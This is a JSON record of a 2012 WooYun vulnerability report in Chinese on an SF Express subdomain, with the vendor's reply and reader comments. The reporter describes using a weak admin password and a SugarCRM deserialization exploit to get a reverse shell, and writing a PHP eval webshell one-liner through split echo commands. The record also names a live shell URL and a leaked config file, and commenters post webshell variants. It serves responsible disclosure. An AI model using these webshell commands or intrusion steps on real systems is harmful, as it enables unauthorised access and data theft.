{"id": 18221, "wybug_id": "wooyun-2012-09230", "wybug_title": "顺丰速运某分站PHP代码执行", "wybug_corp": "顺丰速运", "wybug_author": "an1k3r", "wybug_date": "2012-07-05 09:12", "wybug_open_date": "2012-08-19 09:12", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "后台被猜解", "弱口令", "密码破解", "域传送", "远程代码执行", "服务器配置不当", "网络基础敏", "服务配置不当", "未授权访问", "管理后台对外", "安全", "渗透测试思路", "数据库密码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-19：\t细节向公众公开  简要描述： 其实是漏洞合集啊，包括PHP代码执行，信息泄漏等，导致拿到WebShell。 详细说明：  1. DNS域传送漏洞\n\n2. PHP代码执行漏洞把整理出来的IP扔到NMAP里，找到了一些有风险的系统。地址：http://219.134.187.130:8085/index.php?module=Users&action=Login弱口令admin/admin进入后台。\n\n进入系统之后发现SugarCRM版本是6.2.3,刚好用上最近的一个Exploit（需用户认证）。CVE编号：CVE-2012-0694       SugarCRM CE <= 6.3.1 \"unserialize()\" PHP Code Execution于是拿到反弹shell。\n\n在拿到Webshell之前有个小插曲，发现wget命令不能使用，貌似是防火墙禁止服务器外联。不过touch命令可以使用，vi不能用，只能使用echo。于是创建一个1.php的文件，然后echo写入。\ntouch 1.phpecho \"<?php eval($_POST[cmd])?>\" >> 1.php\n但发现每次写入文件之后，$_POST都会被过滤掉，如下图。\n\n于是想可不可以使用XSS的方法（跟gainover学的，参考了 WooYun: 新浪微博某官方应用存储型XSS - 重温一个利用方法～ ，哈哈）分开写，于是第一行\necho -n \"<?php eval($\" >> 1.php\n第二行\necho -n \"_POST[cmd])?>\" >> 1.php\n\n\n然后用菜刀连上后上传Webshell。\n\nWebshell地址  http://219.134.187.130:8085/shell.php 暂未删除数据库信息\n\n破解MD5后，进入招聘网站后台\n\n3.信息泄漏，包括Oracle数据库的一些信息。http://uatmobile.sf-express.com/SFMobile.xml   漏洞证明：  都在详细说明里了。其它的系统都还好，像JBOSS，OpenFire等，该补的洞都补了，很多系统也升级到最新了。   修复方案：  1. 修改SugarCRM口令。2. 删除http://uatmobile.sf-express.com/SFMobile.xml文件。3. 请删除测试时的Webshell  http://219.134.187.130:8085/shell.php4. 服务如果没有用就停掉，数据库和应用分离。礼物有没有？呵呵，貌似顺丰送礼物是不要快递费的。   版权声明：转载请注明来源 an1k3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-05 09:43 厂商回复： 感谢提供，马上通知处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-05 09:27 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  沙发    \n     2012-07-10 11:42 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个才给10分？    \n     2012-07-16 10:03 |    \t\tubuntu \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:12        | 一切皆有可能……)\t\t \n  HR的，脱裤子了么 ^_^    \n     2012-07-25 14:19 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  牛呀    \n     2012-08-15 02:33 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  这个才10Ran？？？洞主，有礼物没有？    \n     2012-08-20 09:33 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  $_POST不是被过滤掉了，是被双引号内插掉了echo '<?php eval($_POST[cmd]) ?>'就绝对没有问题lzwindows用多了。 必然的    \n     2012-10-11 23:45 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  看了洞主几个洞,功力高深啊    \n     2014-02-28 21:48 |    \t\t健宇 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:14        | tools kid)\t\t \n  洞主有没有测试 echo \"<?php eval($_GET[cmd])?>\"  这样写？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}